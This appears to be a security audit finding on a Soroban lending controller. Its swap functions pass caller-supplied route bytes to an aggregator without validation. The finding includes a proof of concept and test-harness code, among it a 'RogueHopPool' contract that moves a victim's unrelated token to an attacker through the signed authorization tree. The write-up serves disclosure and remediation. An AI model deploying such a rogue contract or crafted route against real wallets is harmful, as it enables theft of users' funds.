### Title
Unvalidated swap routes can inject unauthorized token transfers into the caller’s signed authorization tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
High severity. `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` forward caller-supplied opaque route bytes to the configured swap aggregator without decoding or constraining which contracts the route invokes. [1](#0-0) [2](#0-1)  A malicious route can therefore execute attacker-controlled code beneath the caller’s authorized controller invocation and add an unrelated `token.transfer(caller, attacker, amount)` request to the authorization tree presented for signing. [3](#0-2) [4](#0-3) 

### Finding Description
The controller accepts `swap: Bytes` in `swap_collateral` and passes it through `process_swap_collateral` into `withdraw_and_swap_from_supply`. [1](#0-0) [5](#0-4)  `swap_tokens` treats those bytes as opaque, authorizes only the controller’s exact input-token transfer to the configured router, and invokes `execute_strategy(controller, amount_in, swap)`. [6](#0-5) [7](#0-6) 

This protects the controller’s own input allowance, but it does not prevent route-selected contracts from requesting additional authorization from the original caller while that caller’s root invocation is being simulated and signed. [2](#0-1)  A route can name an attacker-controlled contract as a hop; that contract can then call an unrelated token’s `transfer(victim, attacker, amount)`, which Soroban simulation records as a child of the victim’s `swap_collateral` authorization. [3](#0-2) [8](#0-7) 

The post-swap checks only bound the controller’s `token_in` spend, refund unused input, and require a positive `token_out` balance delta. [9](#0-8) [10](#0-9)  They do not detect a transfer of a different token directly from the caller’s wallet, so the strategy can complete successfully while the unrelated asset is stolen. [11](#0-10) 

### Impact Explanation
A victim who signs the poisoned authorization tree can lose arbitrary spendable tokens unrelated to the lending collateral being swapped. [12](#0-11)  The lending operation itself remains valid: the account receives the expected output and passes the controller’s measured-output and risk checks, so the protocol does not revert or compensate the stolen wallet funds. [13](#0-12) [9](#0-8) 

### Likelihood Explanation
Exploitation requires the victim to submit an attacker-crafted route and sign the resulting authorization tree containing the unexpected token transfer. [14](#0-13) [15](#0-14)  This is plausible where route bytes are obtained from an external quote service or malicious interface and the wallet does not clearly display every nested authorization; the attacker needs no protocol privilege, leaked key, or compromised dependency. [1](#0-0) [2](#0-1) 

### Recommendation
Decode and validate route payloads before execution and reject venue addresses outside a governance-approved registry, or move route execution behind an aggregator interface that enforces such a registry before invoking any pool. [16](#0-15) [6](#0-5)  At minimum, require clients to simulate the complete transaction, decode the returned authorization tree, and reject any child invocation other than the expected controller/token operations before signing. [17](#0-16) 

### Proof of Concept
1. An attacker deploys a contract exposing the venue method expected by the route; the contract is configured with the victim’s address, an unrelated token held by the victim, the attacker’s recipient address, and the amount to steal. [18](#0-17) 
2. The attacker crafts `swap` bytes that route through that contract while still returning enough `token_out` for the lending strategy to pass its positive-output check. [19](#0-18) [10](#0-9) 
3. The victim calls `swap_collateral(caller=victim, account_id, current, amount, new, swap)` on their own account, passing the owner/delegate check. [1](#0-0) [20](#0-19) 
4. The controller authorizes its exact collateral transfer to the router and invokes `execute_strategy` with the attacker-controlled bytes. [21](#0-20) [7](#0-6) 
5. During route execution, the attacker’s contract calls `token.transfer(victim, attacker, amount)`; simulation records that request as a child of the victim’s `swap_collateral` authorization. [22](#0-21) 
6. If the victim signs that tree, the unrelated wallet balance moves to the attacker while the controller still deposits the expected swap output and completes successfully. [15](#0-14)

### Citations

**File:** contracts/controller/src/lib.rs (L283-291)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
```

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-55)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** contracts/controller/src/strategies/swap.rs (L75-83)
```rust
fn verify_router_output(env: &Env, token_out: &Address, balance_before: i128) -> i128 {
    let received = balance_delta_since(
        env,
        token_out,
        &env.current_contract_address(),
        balance_before,
    );
    assert_with_error!(env, received > 0, StrategyError::NoSwapOutput);
    received
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-45)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L166-182)
```rust
    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
        self.try_swap(route)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-226)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-64)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L67-76)
```rust
    let deposit_assets = vec![env, (new.clone(), swapped_amount)];
    supply::process_deposit(
        env,
        &env.current_contract_address(),
        &mut account,
        &deposit_assets,
        &mut cache,
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** common/src/token.rs (L43-51)
```rust
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```

**File:** interfaces/swap-aggregator/src/lib.rs (L18-20)
```rust
#[contractclient(name = "SwapAggregatorClient")]
pub trait SwapAggregatorInterface {
    fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128;
```
